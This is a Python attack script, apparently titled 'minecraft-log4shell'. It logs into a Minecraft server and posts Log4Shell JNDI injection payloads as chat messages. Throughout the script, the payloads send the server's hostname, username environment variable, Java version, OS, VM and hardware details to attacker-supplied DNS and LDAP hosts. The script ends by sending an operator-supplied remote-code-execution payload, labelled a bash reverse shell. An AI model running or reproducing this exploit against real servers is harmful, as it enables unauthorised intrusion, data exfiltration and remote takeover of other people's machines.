#!/usr/bin/env python

import getpass
import sys
import re
from optparse import OptionParser
from time import sleep

from minecraft import authentication
from minecraft.exceptions import YggdrasilError
from minecraft.networking.connection import Connection
from minecraft.networking.packets import Packet, clientbound, serverbound


def get_options():
    parser = OptionParser()

    parser.add_option("-u", "--username", dest="username", default=None,
                      help="username to log in with")

    parser.add_option("-p", "--password", dest="password", default=None,
                      help="password to log in with")

    parser.add_option("-s", "--server", dest="server", default=None,
                      help="server host or host:port"
                           "(enclose IPv6 addresses in square brackets)")

    parser.add_option("-r", "--remote", dest="remote", default=None,
                      help="remote server host:port for payload delivery")

    parser.add_option("--dns", dest="dns", default=None,
                      help="dns host for ping/exfil")

    parser.add_option("--rce", dest="rce", default=None,
                      help="rce payload")

    parser.add_option("-o", "--offline", dest="offline", action="store_true",
                      help="connect to a server in offline mode "
                           "(no password required)")

    parser.add_option("-d", "--dump-packets", dest="dump_packets",
                      action="store_true",
                      help="print sent and received packets to standard error")

    parser.add_option("-v", "--dump-unknown-packets", dest="dump_unknown",
                      action="store_true",
                      help="include unknown packets in --dump-packets output")

    (options, args) = parser.parse_args()

    if not options.username:
        options.username = input("Enter your username: ")

    if not options.password and not options.offline:
        options.password = getpass.getpass("Enter your password (leave "
                                           "blank for offline mode): ")
        options.offline = options.offline or (options.password == "")

    if not options.server:
        options.server = input("Enter server host or host:port "
                               "(enclose IPv6 addresses in square brackets): ")
    # Try to split out port and address
    match = re.match(r"((?P<host>[^\[\]:]+)|\[(?P<addr>[^\[\]]+)\])"
                     r"(:(?P<port>\d+))?$", options.server)
    if match is None:
        raise ValueError("Invalid server address: '%s'." % options.server)
    options.address = match.group("host") or match.group("addr")
    options.port = int(match.group("port") or 25565)

    return options


def main():
    options = get_options()
    cooldown = 2

    if options.offline:
        print("Connecting in offline mode...")
        connection = Connection(
            options.address, options.port, username=options.username)
    else:
        auth_token = authentication.AuthenticationToken()
        try:
            auth_token.authenticate(options.username, options.password)
        except YggdrasilError as e:
            print(e)
            sys.exit()
        print("Logged in as %s..." % auth_token.username)
        connection = Connection(
            options.address, options.port, auth_token=auth_token)

    if options.dump_packets:
        def print_incoming(packet):
            if type(packet) is Packet:
                # This is a direct instance of the base Packet type, meaning
                # that it is a packet of unknown type, so we do not print it
                # unless explicitly requested by the user.
                if options.dump_unknown:
                    print('--> [unknown packet] %s' % packet, file=sys.stderr)
            else:
                print('--> %s' % packet, file=sys.stderr)

        def print_outgoing(packet):
            print('<-- %s' % packet, file=sys.stderr)

        connection.register_packet_listener(
            print_incoming, Packet, early=True)
        connection.register_packet_listener(
            print_outgoing, Packet, outgoing=True)

    def handle_join_game(join_game_packet):
        print('Connected.')

    connection.register_packet_listener(
        handle_join_game, clientbound.play.JoinGamePacket)

    def print_chat(chat_packet):
        print("Message (%s): %s" % (
            chat_packet.field_string('position'), chat_packet.json_data))
        
    def send_chat(msg):
        packet = serverbound.play.ChatPacket()
        packet.message = msg
        connection.write_packet(packet)
        sleep(cooldown)

    connection.register_packet_listener(
        print_chat, clientbound.play.ChatMessagePacket)

    connection.connect()
    sleep(cooldown)  # wait for connection to be established

    # hackity hack hack 
    # start recon
    print("[minecraft-log4shell] sending jndi:dns ping payload...")
    send_chat("${jndi:dns://hostname-${hostName}.%s}" % options.dns)
    sleep(10) 

    print("[minecraft-log4shell] sending jndi:dns user exfil payload...")
    send_chat("${jndi:dns://user-${env:USER}.%s}" % options.dns)

    print("[minecraft-log4shell] sending jndi:dns java version exfil payload...")
    send_chat("${jndi:dns://version-${sys:java.version}.%s}" % options.dns)

    print("[minecraft-log4shell] sending jndi:ldap java version exfil payload...")
    send_chat("${jndi:ldap://%s/${java:version}}" % options.remote)
    
    print("[minecraft-log4shell] sending jndi:ldap os exfil payload...")
    send_chat("${jndi:ldap://%s/${java:os}}" % options.remote)

    print("[minecraft-log4shell] sending jndi:ldap java vm exfil payload...")
    send_chat("${jndi:ldap://%s/${java:vm}}" % options.remote)

    print("[minecraft-log4shell] sending jndi:ldap locale exfil payload...")
    send_chat("${jndi:ldap://%s/${java:locale}}" % options.remote)

    print("[minecraft-log4shell] sending jndi:ldap hw exfil payload...")
    send_chat("${jndi:ldap://%s/${java:hw}}" % options.remote)

    # try rce
    print("[minecraft-log4shell] sending jndi:ldap rce udp bash reverse shell ...")
    send_chat("${jndi:%s}" % options.rce)

    print("[minecraft-log4shell] disconnecting...")
    sys.exit()

if __name__ == "__main__":
    main()